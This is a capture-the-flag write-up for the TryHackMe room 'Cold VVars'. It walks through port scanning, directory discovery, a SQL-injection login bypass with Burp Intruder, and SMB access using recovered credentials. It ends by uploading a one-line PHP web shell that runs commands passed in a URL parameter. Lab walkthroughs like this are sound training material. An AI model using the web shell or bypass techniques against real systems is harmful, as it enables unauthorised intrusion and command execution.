# Cold VVars
![image](https://user-images.githubusercontent.com/5285547/125272663-03ea6780-e304-11eb-9595-4169d0b8fdc3.png)
Room link: https://tryhackme.com/room/coldvvars

Target IP: 10.10.236.49

## Nmap 

```
PORT     STATE SERVICE
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
8080/tcp open  http-proxy
8082/tcp open  blackice-alerts
```

## Websites
### Port 8080

After a quick gobuster I found a new endpoint /dev, can use OPTIONS to bypass the 403,405
```
http://10.10.236.49:8080/dev/
http://10.10.236.49:8080/dev/note.txt
```
```
curl 10.10.236.49:8080/dev/note.txt 
```
Contents: 
```
Secure File Upload and Testing Functionality
```

### Port 8082

Home page
```
http://10.10.236.49:8082
```

### Brutefoce login (sqli) 
Scanning the URL with gobuster shows a login page (/login)  

[Bypass List: Sql Injection List](/tryhackme/coldVVars/sql_Injection_Bypass.txt)

Using burp's intruder we can capture the login and use the payloads from the list above. 

![image](https://user-images.githubusercontent.com/5285547/125278244-60e91c00-e30a-11eb-8c17-5f1195f81baf.png)

### SMB

Seeing we have SMB ports open lets enum the SMB protocal. 

```
smbclient -L \\10.10.236.49
```

![image](https://user-images.githubusercontent.com/5285547/125278478-b45b6a00-e30a-11eb-8dc2-12314c2701ae.png)

We have no READ/WRITE as a guest user. Lets try the creds from above for the SECURED samba share. 

Login SMB
```
smbclient \\\\10.10.236.49\\Secured -U ArthurMorgan
pass: DeadEye
```

Now we are logged in we can get a reverse shell, putting a file on the server. 

```
Enter WORKGROUP\ArthurMorgan's password: 
Try "help" to get a list of possible commands.
smb: \> put shell.php
putting file shell.php as \shell.php (0.2 kb/s) (average 0.2 kb/s)
smb: \> ls
  .                                   D        0  Mon Jul 12 12:18:30 2021
  ..                                  D        0  Thu Mar 11 12:52:29 2021
  note.txt                            A       45  Thu Mar 11 12:19:52 2021
  shell.php                           A       28  Mon Jul 12 12:18:30 2021

                7743660 blocks of size 1024. 4483140 blocks available
```

Knowing where note.txt was stored from earlier we can get the shell.php file at  
```
http://10.10.236.49/dev/shell.php?c=id
```
![image](https://user-images.githubusercontent.com/5285547/125279259-a528ec00-e30b-11eb-8c23-8fb65ac80de3.png)

You can use a php reverse shell here, I like to test with a simple php script first.  
shell.php
```
<?php system($_GET['c']);?>
```
  



